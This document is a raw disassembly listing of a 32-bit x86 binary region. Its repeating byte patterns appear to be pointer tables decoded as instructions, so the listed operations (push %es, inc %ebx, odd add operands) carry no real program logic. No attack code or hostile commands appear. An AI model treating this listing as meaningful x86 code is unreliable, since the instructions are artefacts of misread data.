  401dcb:	00 8a c4 40 00 0c    	add    %cl,0xc0040c4(%edx)
  401dd1:	06                   	push   %es
  401dd2:	43                   	inc    %ebx
  401dd3:	00 06                	add    %al,(%esi)
  401dd5:	06                   	push   %es
  401dd6:	43                   	inc    %ebx
  401dd7:	00 00                	add    %al,(%eax)
  401dd9:	06                   	push   %es
  401dda:	43                   	inc    %ebx
  401ddb:	00 fa                	add    %bh,%dl
  401ddd:	05 43 00 f4 05       	add    $0x5f40043,%eax
  401de2:	43                   	inc    %ebx
  401de3:	00 ee                	add    %ch,%dh
  401de5:	05 43 00 e8 05       	add    $0x5e80043,%eax
  401dea:	43                   	inc    %ebx
  401deb:	00 e2                	add    %ah,%dl
  401ded:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  401df2:	43                   	inc    %ebx
  401df3:	00 d6                	add    %dl,%dh
  401df5:	05 43 00 d0 05       	add    $0x5d00043,%eax
  401dfa:	43                   	inc    %ebx
  401dfb:	00 ca                	add    %cl,%dl
  401dfd:	05 43 00 c4 05       	add    $0x5c40043,%eax
  401e02:	43                   	inc    %ebx
  401e03:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  401e09:	05 43 00 b2 05       	add    $0x5b20043,%eax
  401e0e:	43                   	inc    %ebx
  401e0f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  401e16:	43                   	inc    %ebx
  401e17:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  401e1d:	05 43 00 94 05       	add    $0x5940043,%eax
  401e22:	43                   	inc    %ebx
  401e23:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  401e29:	60                   	pusha
  401e2a:	41                   	inc    %ecx
  401e2b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  401e31:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  401e36:	43                   	inc    %ebx
  401e37:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  401e3d:	05 43 00 76 05       	add    $0x5760043,%eax
  401e42:	43                   	inc    %ebx
  401e43:	00 70 05             	add    %dh,0x5(%eax)
  401e46:	43                   	inc    %ebx
  401e47:	00 6a 05             	add    %ch,0x5(%edx)
  401e4a:	43                   	inc    %ebx
  401e4b:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  401e51:	06                   	push   %es
  401e52:	43                   	inc    %ebx
  401e53:	00 58 05             	add    %bl,0x5(%eax)
  401e56:	43                   	inc    %ebx
  401e57:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  401e5d:	06                   	push   %es
  401e5e:	43                   	inc    %ebx
  401e5f:	00 7e 06             	add    %bh,0x6(%esi)
  401e62:	43                   	inc    %ebx
  401e63:	00 78 06             	add    %bh,0x6(%eax)
  401e66:	43                   	inc    %ebx
  401e67:	00 72 06             	add    %dh,0x6(%edx)
  401e6a:	43                   	inc    %ebx
  401e6b:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  401e6f:	00 66 06             	add    %ah,0x6(%esi)
  401e72:	43                   	inc    %ebx
  401e73:	00 f3                	add    %dh,%bl
  401e75:	ac                   	lods   %ds:(%esi),%al
  401e76:	40                   	inc    %eax
  401e77:	00 3f                	add    %bh,(%edi)
  401e79:	ad                   	lods   %ds:(%esi),%eax
  401e7a:	40                   	inc    %eax
  401e7b:	00 00                	add    %al,(%eax)
  401e7d:	00 00                	add    %al,(%eax)
  401e7f:	00 20                	add    %ah,(%eax)
  401e81:	7a 40                	jp     0x401ec3
  401e83:	00 a8 06 43 00 e7    	add    %ch,-0x18ffbcfa(%eax)
  401e89:	d3 40 00             	roll   %cl,0x0(%eax)
  401e8c:	94                   	xchg   %eax,%esp
  401e8d:	60                   	pusha
  401e8e:	41                   	inc    %ecx
  401e8f:	00 30                	add    %dh,(%eax)
  401e91:	44                   	inc    %esp
  401e92:	41                   	inc    %ecx
  401e93:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  401e9a:	43                   	inc    %ebx
  401e9b:	00 30                	add    %dh,(%eax)
  401e9d:	06                   	push   %es
  401e9e:	43                   	inc    %ebx
  401e9f:	00 2a                	add    %ch,(%edx)
  401ea1:	06                   	push   %es
  401ea2:	43                   	inc    %ebx
  401ea3:	00 24 06             	add    %ah,(%esi,%eax,1)
  401ea6:	43                   	inc    %ebx
  401ea7:	00 1e                	add    %bl,(%esi)
  401ea9:	06                   	push   %es
  401eaa:	43                   	inc    %ebx
  401eab:	00 18                	add    %bl,(%eax)
  401ead:	06                   	push   %es
  401eae:	43                   	inc    %ebx
  401eaf:	00 12                	add    %dl,(%edx)
  401eb1:	06                   	push   %es
  401eb2:	43                   	inc    %ebx
  401eb3:	00 98 ad 40 00 0c    	add    %bl,0xc0040ad(%eax)
  401eb9:	06                   	push   %es
  401eba:	43                   	inc    %ebx
  401ebb:	00 06                	add    %al,(%esi)
  401ebd:	06                   	push   %es
  401ebe:	43                   	inc    %ebx
  401ebf:	00 00                	add    %al,(%eax)
  401ec1:	06                   	push   %es
  401ec2:	43                   	inc    %ebx
  401ec3:	00 fa                	add    %bh,%dl
  401ec5:	05 43 00 f4 05       	add    $0x5f40043,%eax
  401eca:	43                   	inc    %ebx
  401ecb:	00 ee                	add    %ch,%dh
  401ecd:	05 43 00 e8 05       	add    $0x5e80043,%eax
  401ed2:	43                   	inc    %ebx
  401ed3:	00 e2                	add    %ah,%dl
  401ed5:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  401eda:	43                   	inc    %ebx
  401edb:	00 d6                	add    %dl,%dh
  401edd:	05 43 00 d0 05       	add    $0x5d00043,%eax
  401ee2:	43                   	inc    %ebx
  401ee3:	00 ca                	add    %cl,%dl
  401ee5:	05 43 00 c4 05       	add    $0x5c40043,%eax
  401eea:	43                   	inc    %ebx
  401eeb:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  401ef1:	05 43 00 b2 05       	add    $0x5b20043,%eax
  401ef6:	43                   	inc    %ebx
  401ef7:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  401efe:	43                   	inc    %ebx
  401eff:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  401f05:	05 43 00 94 05       	add    $0x5940043,%eax
  401f0a:	43                   	inc    %ebx
  401f0b:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  401f11:	60                   	pusha
  401f12:	41                   	inc    %ecx
  401f13:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  401f19:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  401f1e:	43                   	inc    %ebx
  401f1f:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  401f25:	05 43 00 76 05       	add    $0x5760043,%eax
  401f2a:	43                   	inc    %ebx
  401f2b:	00 70 05             	add    %dh,0x5(%eax)
  401f2e:	43                   	inc    %ebx
  401f2f:	00 6a 05             	add    %ch,0x5(%edx)
  401f32:	43                   	inc    %ebx
  401f33:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  401f39:	06                   	push   %es
  401f3a:	43                   	inc    %ebx
  401f3b:	00 58 05             	add    %bl,0x5(%eax)
  401f3e:	43                   	inc    %ebx
  401f3f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  401f45:	06                   	push   %es
  401f46:	43                   	inc    %ebx
  401f47:	00 9e ad 40 00 78    	add    %bl,0x780040ad(%esi)
  401f4d:	06                   	push   %es
  401f4e:	43                   	inc    %ebx
  401f4f:	00 47 ae             	add    %al,-0x52(%edi)
  401f52:	40                   	inc    %eax
  401f53:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  401f57:	00 66 06             	add    %ah,0x6(%esi)
  401f5a:	43                   	inc    %ebx
  401f5b:	00 63 ae             	add    %ah,-0x52(%ebx)
  401f5e:	40                   	inc    %eax
  401f5f:	00 17                	add    %dl,(%edi)
  401f61:	af                   	scas   %es:(%edi),%eax
  401f62:	40                   	inc    %eax
  401f63:	00 00                	add    %al,(%eax)
  401f65:	00 00                	add    %al,(%eax)
  401f67:	00 78 7a             	add    %bh,0x7a(%eax)
  401f6a:	40                   	inc    %eax
  401f6b:	00 a8 06 43 00 4d    	add    %ch,0x4d004306(%eax)
  401f71:	d4 40                	aam    $0x40
  401f73:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  401f7a:	41                   	inc    %ecx
  401f7b:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  401f82:	43                   	inc    %ebx
  401f83:	00 30                	add    %dh,(%eax)
  401f85:	06                   	push   %es
  401f86:	43                   	inc    %ebx
  401f87:	00 2a                	add    %ch,(%edx)
  401f89:	06                   	push   %es
  401f8a:	43                   	inc    %ebx
  401f8b:	00 24 06             	add    %ah,(%esi,%eax,1)
  401f8e:	43                   	inc    %ebx
  401f8f:	00 1e                	add    %bl,(%esi)
  401f91:	06                   	push   %es
  401f92:	43                   	inc    %ebx
  401f93:	00 18                	add    %bl,(%eax)
  401f95:	06                   	push   %es
  401f96:	43                   	inc    %ebx
  401f97:	00 12                	add    %dl,(%edx)
  401f99:	06                   	push   %es
  401f9a:	43                   	inc    %ebx
  401f9b:	00 62 b0             	add    %ah,-0x50(%edx)
  401f9e:	40                   	inc    %eax
  401f9f:	00 0c 06             	add    %cl,(%esi,%eax,1)
  401fa2:	43                   	inc    %ebx
  401fa3:	00 06                	add    %al,(%esi)
  401fa5:	06                   	push   %es
  401fa6:	43                   	inc    %ebx
  401fa7:	00 00                	add    %al,(%eax)
  401fa9:	06                   	push   %es
  401faa:	43                   	inc    %ebx
  401fab:	00 fa                	add    %bh,%dl
  401fad:	05 43 00 f4 05       	add    $0x5f40043,%eax
  401fb2:	43                   	inc    %ebx
  401fb3:	00 ee                	add    %ch,%dh
  401fb5:	05 43 00 e8 05       	add    $0x5e80043,%eax
  401fba:	43                   	inc    %ebx
  401fbb:	00 e2                	add    %ah,%dl
  401fbd:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  401fc2:	43                   	inc    %ebx
  401fc3:	00 d6                	add    %dl,%dh
  401fc5:	05 43 00 d0 05       	add    $0x5d00043,%eax
  401fca:	43                   	inc    %ebx
  401fcb:	00 ca                	add    %cl,%dl
  401fcd:	05 43 00 c4 05       	add    $0x5c40043,%eax
  401fd2:	43                   	inc    %ebx
  401fd3:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  401fd9:	05 43 00 b2 05       	add    $0x5b20043,%eax
  401fde:	43                   	inc    %ebx
  401fdf:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  401fe6:	43                   	inc    %ebx
  401fe7:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  401fed:	05 43 00 94 05       	add    $0x5940043,%eax
  401ff2:	43                   	inc    %ebx
  401ff3:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  401ff9:	60                   	pusha
  401ffa:	41                   	inc    %ecx
  401ffb:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  402001:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  402006:	43                   	inc    %ebx
  402007:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  40200d:	05 43 00 76 05       	add    $0x5760043,%eax
  402012:	43                   	inc    %ebx
  402013:	00 70 05             	add    %dh,0x5(%eax)
  402016:	43                   	inc    %ebx
  402017:	00 6a 05             	add    %ch,0x5(%edx)
  40201a:	43                   	inc    %ebx
  40201b:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402021:	06                   	push   %es
  402022:	43                   	inc    %ebx
  402023:	00 58 05             	add    %bl,0x5(%eax)
  402026:	43                   	inc    %ebx
  402027:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  40202d:	06                   	push   %es
  40202e:	43                   	inc    %ebx
  40202f:	00 47 d6             	add    %al,-0x2a(%edi)
  402032:	40                   	inc    %eax
  402033:	00 78 06             	add    %bh,0x6(%eax)
  402036:	43                   	inc    %ebx
  402037:	00 68 b0             	add    %ch,-0x50(%eax)
  40203a:	40                   	inc    %eax
  40203b:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  40203f:	00 66 06             	add    %ah,0x6(%esi)
  402042:	43                   	inc    %ebx
  402043:	00 1e                	add    %bl,(%esi)
  402045:	b2 40                	mov    $0x40,%dl
  402047:	00 79 b2             	add    %bh,-0x4e(%ecx)
  40204a:	40                   	inc    %eax
  40204b:	00 00                	add    %al,(%eax)
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 d0                	add    %dl,%al
  402051:	7a 40                	jp     0x402093
  402053:	00 a8 06 43 00 b3    	add    %ch,-0x4cffbcfa(%eax)
  402059:	d4 40                	aam    $0x40
  40205b:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  402062:	41                   	inc    %ecx
  402063:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  40206a:	43                   	inc    %ebx
  40206b:	00 30                	add    %dh,(%eax)
  40206d:	06                   	push   %es
  40206e:	43                   	inc    %ebx
  40206f:	00 2a                	add    %ch,(%edx)
  402071:	06                   	push   %es
  402072:	43                   	inc    %ebx
  402073:	00 24 06             	add    %ah,(%esi,%eax,1)
  402076:	43                   	inc    %ebx
  402077:	00 1e                	add    %bl,(%esi)
  402079:	06                   	push   %es
  40207a:	43                   	inc    %ebx
  40207b:	00 18                	add    %bl,(%eax)
  40207d:	06                   	push   %es
  40207e:	43                   	inc    %ebx
  40207f:	00 12                	add    %dl,(%edx)
  402081:	06                   	push   %es
  402082:	43                   	inc    %ebx
  402083:	00 f4                	add    %dh,%ah
  402085:	b3 40                	mov    $0x40,%bl
  402087:	00 0c 06             	add    %cl,(%esi,%eax,1)
  40208a:	43                   	inc    %ebx
  40208b:	00 06                	add    %al,(%esi)
  40208d:	06                   	push   %es
  40208e:	43                   	inc    %ebx
  40208f:	00 00                	add    %al,(%eax)
  402091:	06                   	push   %es
  402092:	43                   	inc    %ebx
  402093:	00 fa                	add    %bh,%dl
  402095:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40209a:	43                   	inc    %ebx
  40209b:	00 ee                	add    %ch,%dh
  40209d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  4020a2:	43                   	inc    %ebx
  4020a3:	00 e2                	add    %ah,%dl
  4020a5:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  4020aa:	43                   	inc    %ebx
  4020ab:	00 d6                	add    %dl,%dh
  4020ad:	05 43 00 d0 05       	add    $0x5d00043,%eax
  4020b2:	43                   	inc    %ebx
  4020b3:	00 ca                	add    %cl,%dl
  4020b5:	05 43 00 c4 05       	add    $0x5c40043,%eax
  4020ba:	43                   	inc    %ebx
  4020bb:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  4020c1:	05 43 00 b2 05       	add    $0x5b20043,%eax
  4020c6:	43                   	inc    %ebx
  4020c7:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  4020ce:	43                   	inc    %ebx
  4020cf:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  4020d5:	05 43 00 94 05       	add    $0x5940043,%eax
  4020da:	43                   	inc    %ebx
  4020db:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4020e1:	60                   	pusha
  4020e2:	41                   	inc    %ecx
  4020e3:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4020e9:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4020ee:	43                   	inc    %ebx
  4020ef:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4020f5:	05 43 00 76 05       	add    $0x5760043,%eax
  4020fa:	43                   	inc    %ebx
  4020fb:	00 70 05             	add    %dh,0x5(%eax)
  4020fe:	43                   	inc    %ebx
  4020ff:	00 6a 05             	add    %ch,0x5(%edx)
  402102:	43                   	inc    %ebx
  402103:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  402109:	06                   	push   %es
  40210a:	43                   	inc    %ebx
  40210b:	00 58 05             	add    %bl,0x5(%eax)
  40210e:	43                   	inc    %ebx
  40210f:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  402115:	06                   	push   %es
  402116:	43                   	inc    %ebx
  402117:	00 fa                	add    %bh,%dl
  402119:	b3 40                	mov    $0x40,%bl
  40211b:	00 78 06             	add    %bh,0x6(%eax)
  40211e:	43                   	inc    %ebx
  40211f:	00 cd                	add    %cl,%ch
  402121:	b4 40                	mov    $0x40,%ah
  402123:	00 6c 06 43          	add    %ch,0x43(%esi,%eax,1)
  402127:	00 66 06             	add    %ah,0x6(%esi)
  40212a:	43                   	inc    %ebx
  40212b:	00 99 b5 40 00 56    	add    %bl,0x560040b5(%ecx)
  402131:	b6 40                	mov    $0x40,%dh
  402133:	00 00                	add    %al,(%eax)
  402135:	00 00                	add    %al,(%eax)
  402137:	00 28                	add    %ch,(%eax)
  402139:	7b 40                	jnp    0x40217b
  40213b:	00 a8 06 43 00 b3    	add    %ch,-0x4cffbcfa(%eax)
  402141:	d4 40                	aam    $0x40
  402143:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  40214a:	41                   	inc    %ecx
  40214b:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  402152:	43                   	inc    %ebx
  402153:	00 30                	add    %dh,(%eax)
  402155:	06                   	push   %es
  402156:	43                   	inc    %ebx
  402157:	00 2a                	add    %ch,(%edx)
  402159:	06                   	push   %es
  40215a:	43                   	inc    %ebx
  40215b:	00 24 06             	add    %ah,(%esi,%eax,1)
  40215e:	43                   	inc    %ebx
  40215f:	00 1e                	add    %bl,(%esi)
  402161:	06                   	push   %es
  402162:	43                   	inc    %ebx
  402163:	00 18                	add    %bl,(%eax)
  402165:	06                   	push   %es
  402166:	43                   	inc    %ebx
  402167:	00 12                	add    %dl,(%edx)
  402169:	06                   	push   %es
  40216a:	43                   	inc    %ebx
  40216b:	00 08                	add    %cl,(%eax)
  40216d:	b9 40 00 0c 06       	mov    $0x60c0040,%ecx
  402172:	43                   	inc    %ebx
  402173:	00 06                	add    %al,(%esi)
  402175:	06                   	push   %es
  402176:	43                   	inc    %ebx
  402177:	00 00                	add    %al,(%eax)
  402179:	06                   	push   %es
  40217a:	43                   	inc    %ebx
  40217b:	00 fa                	add    %bh,%dl
  40217d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402182:	43                   	inc    %ebx
  402183:	00 ee                	add    %ch,%dh
  402185:	05 43 00 e8 05       	add    $0x5e80043,%eax
  40218a:	43                   	inc    %ebx
  40218b:	00 e2                	add    %ah,%dl
  40218d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402192:	43                   	inc    %ebx
  402193:	00 d6                	add    %dl,%dh
  402195:	05 43 00 d0 05       	add    $0x5d00043,%eax
  40219a:	43                   	inc    %ebx
  40219b:	00 ca                	add    %cl,%dl
  40219d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  4021a2:	43                   	inc    %ebx
  4021a3:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  4021a9:	05 43 00 b2 05       	add    $0x5b20043,%eax
  4021ae:	43                   	inc    %ebx
  4021af:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  4021b6:	43                   	inc    %ebx
  4021b7:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  4021bd:	05 43 00 94 05       	add    $0x5940043,%eax
  4021c2:	43                   	inc    %ebx
  4021c3:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4021c9:	60                   	pusha
  4021ca:	41                   	inc    %ecx
  4021cb:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4021d1:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4021d6:	43                   	inc    %ebx
  4021d7:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4021dd:	05 43 00 76 05       	add    $0x5760043,%eax
  4021e2:	43                   	inc    %ebx
  4021e3:	00 70 05             	add    %dh,0x5(%eax)
  4021e6:	43                   	inc    %ebx
  4021e7:	00 6a 05             	add    %ch,0x5(%edx)
  4021ea:	43                   	inc    %ebx
  4021eb:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4021f1:	06                   	push   %es
  4021f2:	43                   	inc    %ebx
  4021f3:	00 58 05             	add    %bl,0x5(%eax)
  4021f6:	43                   	inc    %ebx
  4021f7:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4021fd:	06                   	push   %es
  4021fe:	43                   	inc    %ebx
  4021ff:	00 0e                	add    %cl,(%esi)
  402201:	b9 40 00 78 06       	mov    $0x6780040,%ecx
  402206:	43                   	inc    %ebx
  402207:	00 ff                	add    %bh,%bh
  402209:	b9 40 00 6c 06       	mov    $0x66c0040,%ecx
  40220e:	43                   	inc    %ebx
  40220f:	00 66 06             	add    %ah,0x6(%esi)
  402212:	43                   	inc    %ebx
  402213:	00 ac ba 40 00 7b bb 	add    %ch,-0x4484ffc0(%edx,%edi,4)
  40221a:	40                   	inc    %eax
  40221b:	00 00                	add    %al,(%eax)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	00 80 7b 40 00 a8    	add    %al,-0x57ffbf85(%eax)
  402225:	06                   	push   %es
  402226:	43                   	inc    %ebx
  402227:	00 b3 d4 40 00 94    	add    %dh,-0x6bffbf2c(%ebx)
  40222d:	60                   	pusha
  40222e:	41                   	inc    %ecx
  40222f:	00 30                	add    %dh,(%eax)
  402231:	44                   	inc    %esp
  402232:	41                   	inc    %ecx
  402233:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  40223a:	43                   	inc    %ebx
  40223b:	00 30                	add    %dh,(%eax)
  40223d:	06                   	push   %es
  40223e:	43                   	inc    %ebx
  40223f:	00 2a                	add    %ch,(%edx)
  402241:	06                   	push   %es
  402242:	43                   	inc    %ebx
  402243:	00 24 06             	add    %ah,(%esi,%eax,1)
  402246:	43                   	inc    %ebx
  402247:	00 1e                	add    %bl,(%esi)
  402249:	06                   	push   %es
  40224a:	43                   	inc    %ebx
  40224b:	00 18                	add    %bl,(%eax)
  40224d:	06                   	push   %es
  40224e:	43                   	inc    %ebx
  40224f:	00 12                	add    %dl,(%edx)
  402251:	06                   	push   %es
  402252:	43                   	inc    %ebx
  402253:	00 47 bc             	add    %al,-0x44(%edi)
  402256:	40                   	inc    %eax
  402257:	00 0c 06             	add    %cl,(%esi,%eax,1)
  40225a:	43                   	inc    %ebx
  40225b:	00 06                	add    %al,(%esi)
  40225d:	06                   	push   %es
  40225e:	43                   	inc    %ebx
  40225f:	00 00                	add    %al,(%eax)
  402261:	06                   	push   %es
  402262:	43                   	inc    %ebx
  402263:	00 fa                	add    %bh,%dl
  402265:	05 43 00 f4 05       	add    $0x5f40043,%eax
  40226a:	43                   	inc    %ebx
  40226b:	00 ee                	add    %ch,%dh
  40226d:	05 43 00 e8 05       	add    $0x5e80043,%eax
  402272:	43                   	inc    %ebx
  402273:	00 e2                	add    %ah,%dl
  402275:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  40227a:	43                   	inc    %ebx
  40227b:	00 d6                	add    %dl,%dh
  40227d:	05 43 00 d0 05       	add    $0x5d00043,%eax
  402282:	43                   	inc    %ebx
  402283:	00 ca                	add    %cl,%dl
  402285:	05 43 00 c4 05       	add    $0x5c40043,%eax
  40228a:	43                   	inc    %ebx
  40228b:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402291:	05 43 00 b2 05       	add    $0x5b20043,%eax
  402296:	43                   	inc    %ebx
  402297:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  40229e:	43                   	inc    %ebx
  40229f:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  4022a5:	05 43 00 94 05       	add    $0x5940043,%eax
  4022aa:	43                   	inc    %ebx
  4022ab:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  4022b1:	60                   	pusha
  4022b2:	41                   	inc    %ecx
  4022b3:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4022b9:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4022be:	43                   	inc    %ebx
  4022bf:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4022c5:	05 43 00 76 05       	add    $0x5760043,%eax
  4022ca:	43                   	inc    %ebx
  4022cb:	00 70 05             	add    %dh,0x5(%eax)
  4022ce:	43                   	inc    %ebx
  4022cf:	00 6a 05             	add    %ch,0x5(%edx)
  4022d2:	43                   	inc    %ebx
  4022d3:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4022d9:	06                   	push   %es
  4022da:	43                   	inc    %ebx
  4022db:	00 58 05             	add    %bl,0x5(%eax)
  4022de:	43                   	inc    %ebx
  4022df:	00 8a 06 43 00 84    	add    %cl,-0x7bffbcfa(%edx)
  4022e5:	06                   	push   %es
  4022e6:	43                   	inc    %ebx
  4022e7:	00 4d bc             	add    %cl,-0x44(%ebp)
  4022ea:	40                   	inc    %eax
  4022eb:	00 78 06             	add    %bh,0x6(%eax)
  4022ee:	43                   	inc    %ebx
  4022ef:	00 c6                	add    %al,%dh
  4022f1:	bc 40 00 6c 06       	mov    $0x66c0040,%esp
  4022f6:	43                   	inc    %ebx
  4022f7:	00 66 06             	add    %ah,0x6(%esi)
  4022fa:	43                   	inc    %ebx
  4022fb:	00 47 bd             	add    %al,-0x43(%edi)
  4022fe:	40                   	inc    %eax
  4022ff:	00 8e bd 40 00 00    	add    %cl,0x40bd(%esi)
  402305:	00 00                	add    %al,(%eax)
  402307:	00 d8                	add    %bl,%al
  402309:	7b 40                	jnp    0x40234b
  40230b:	00 a8 06 43 00 b3    	add    %ch,-0x4cffbcfa(%eax)
  402311:	d4 40                	aam    $0x40
  402313:	00 94 60 41 00 30 44 	add    %dl,0x44300041(%eax,%eiz,2)
  40231a:	41                   	inc    %ecx
  40231b:	00 94 60 41 00 a2 06 	add    %dl,0x6a20041(%eax,%eiz,2)
  402322:	43                   	inc    %ebx
  402323:	00 30                	add    %dh,(%eax)
  402325:	06                   	push   %es
  402326:	43                   	inc    %ebx
  402327:	00 2a                	add    %ch,(%edx)
  402329:	06                   	push   %es
  40232a:	43                   	inc    %ebx
  40232b:	00 24 06             	add    %ah,(%esi,%eax,1)
  40232e:	43                   	inc    %ebx
  40232f:	00 1e                	add    %bl,(%esi)
  402331:	06                   	push   %es
  402332:	43                   	inc    %ebx
  402333:	00 18                	add    %bl,(%eax)
  402335:	06                   	push   %es
  402336:	43                   	inc    %ebx
  402337:	00 12                	add    %dl,(%edx)
  402339:	06                   	push   %es
  40233a:	43                   	inc    %ebx
  40233b:	00 cb                	add    %cl,%bl
  40233d:	c0 40 00 0c          	rolb   $0xc,0x0(%eax)
  402341:	06                   	push   %es
  402342:	43                   	inc    %ebx
  402343:	00 06                	add    %al,(%esi)
  402345:	06                   	push   %es
  402346:	43                   	inc    %ebx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	43                   	inc    %ebx
  40234b:	00 fa                	add    %bh,%dl
  40234d:	05 43 00 f4 05       	add    $0x5f40043,%eax
  402352:	43                   	inc    %ebx
  402353:	00 ee                	add    %ch,%dh
  402355:	05 43 00 e8 05       	add    $0x5e80043,%eax
  40235a:	43                   	inc    %ebx
  40235b:	00 e2                	add    %ah,%dl
  40235d:	05 43 00 dc 05       	add    $0x5dc0043,%eax
  402362:	43                   	inc    %ebx
  402363:	00 d6                	add    %dl,%dh
  402365:	05 43 00 d0 05       	add    $0x5d00043,%eax
  40236a:	43                   	inc    %ebx
  40236b:	00 ca                	add    %cl,%dl
  40236d:	05 43 00 c4 05       	add    $0x5c40043,%eax
  402372:	43                   	inc    %ebx
  402373:	00 be 05 43 00 b8    	add    %bh,-0x47ffbcfb(%esi)
  402379:	05 43 00 b2 05       	add    $0x5b20043,%eax
  40237e:	43                   	inc    %ebx
  40237f:	00 ac 05 43 00 a6 05 	add    %ch,0x5a60043(%ebp,%eax,1)
  402386:	43                   	inc    %ebx
  402387:	00 a0 05 43 00 9a    	add    %ah,-0x65ffbcfb(%eax)
  40238d:	05 43 00 94 05       	add    $0x5940043,%eax
  402392:	43                   	inc    %ebx
  402393:	00 8e 05 43 00 94    	add    %cl,-0x6bffbcfb(%esi)
  402399:	60                   	pusha
  40239a:	41                   	inc    %ecx
  40239b:	00 88 a9 40 00 94    	add    %cl,-0x6bffbf57(%eax)
  4023a1:	a9 40 00 9c 06       	test   $0x69c0040,%eax
  4023a6:	43                   	inc    %ebx
  4023a7:	00 82 05 43 00 7c    	add    %al,0x7c004305(%edx)
  4023ad:	05 43 00 76 05       	add    $0x5760043,%eax
  4023b2:	43                   	inc    %ebx
  4023b3:	00 70 05             	add    %dh,0x5(%eax)
  4023b6:	43                   	inc    %ebx
  4023b7:	00 6a 05             	add    %ch,0x5(%edx)
  4023ba:	43                   	inc    %ebx
  4023bb:	00 96 06 43 00 90    	add    %dl,-0x6fffbcfa(%esi)
  4023c1:	06                   	push   %es
  4023c2:	43                   	inc    %ebx
  4023c3:	00 58 05             	add    %bl,0x5(%eax)
  4023c6:	43                   	inc    %ebx
